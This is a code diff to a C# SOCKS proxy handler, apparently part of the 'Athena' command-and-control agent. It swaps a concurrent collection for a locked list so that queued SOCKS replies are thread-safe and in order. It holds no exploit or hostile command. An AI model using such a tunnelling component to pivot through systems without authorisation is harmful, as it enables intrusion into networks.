@@ -14,7 +14,9 @@ namespace Athena.Commands.Model
     {
         private CancellationTokenSource ct { get; set; }
         private ConcurrentDictionary<int, AthenaSocksConnection> connections { get; set; }
-        private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
+        //private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
+        private List<SocksMessage> messagesOut = new List<SocksMessage>();
+        private object _lock = new object();
         public bool running { get; set; }
 
         public SocksHandler()
@@ -33,7 +35,7 @@ namespace Athena.Commands.Model
             this.ct = new CancellationTokenSource();
             //this.connections = new Dictionary<int, SocksConnection>();
             this.connections = new ConcurrentDictionary<int, AthenaSocksConnection>();
-            this.messagesOut = new ConcurrentBag<SocksMessage>();
+            this.messagesOut = new List<SocksMessage>();
 
             return true;
         }
@@ -103,10 +105,13 @@ namespace Athena.Commands.Model
             {
                 return new List<SocksMessage>();
             }
+            List<SocksMessage> msgOut;
+            lock (_lock)
+            {
+                msgOut = new List<SocksMessage>(this.messagesOut);
+                this.messagesOut.Clear();
+            }
 
-            List<SocksMessage> msgOut = new List<SocksMessage>(this.messagesOut);
-            this.messagesOut.Clear();
-            msgOut.Reverse();
             return msgOut;
         }
 
@@ -166,7 +171,28 @@ namespace Athena.Commands.Model
 
                         if (!sc.IsConnected)
                         {
-                            this.messagesOut.Add(new SocksMessage
+                            lock (_lock)
+                            {
+                                this.messagesOut.Insert(0,new SocksMessage
+                                {
+                                    server_id = sc.server_id,
+                                    data = Misc.Base64Encode(new ConnectResponse
+                                    {
+                                        bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
+                                        bndport = new byte[] { 0x00, 0x00 },
+                                        addrtype = co.addressType,
+                                        status = ConnectResponseStatus.GeneralFailure,
+
+                                    }.ToByte()).Result,
+                                });
+                            }
+                        }
+                    }
+                    catch
+                    {
+                        lock (_lock)
+                        {
+                            this.messagesOut.Insert(0,new SocksMessage
                             {
                                 server_id = sc.server_id,
                                 data = Misc.Base64Encode(new ConnectResponse
@@ -174,26 +200,11 @@ namespace Athena.Commands.Model
                                     bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                                     bndport = new byte[] { 0x00, 0x00 },
                                     addrtype = co.addressType,
-                                    status = ConnectResponseStatus.GeneralFailure,
+                                    status = ConnectResponseStatus.GeneralFailure
 
                                 }.ToByte()).Result,
                             });
                         }
-                    }
-                    catch
-                    {
-                        this.messagesOut.Add(new SocksMessage
-                        {
-                            server_id = sc.server_id,
-                            data = Misc.Base64Encode(new ConnectResponse
-                            {
-                                bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
-                                bndport = new byte[] { 0x00, 0x00 },
-                                addrtype = co.addressType,
-                                status = ConnectResponseStatus.GeneralFailure
-
-                            }.ToByte()).Result,
-                        });
                     }
                 });
             }
@@ -220,7 +231,10 @@ namespace Athena.Commands.Model
         public void ReturnMessage(SocksMessage sm)
         {
             //If a message gets deleted before this gets called, then I throw an error
-            this.messagesOut.Add(sm);
+            lock (_lock)
+            {
+                this.messagesOut.Insert(0, sm);
+            }
         }
     }
 }
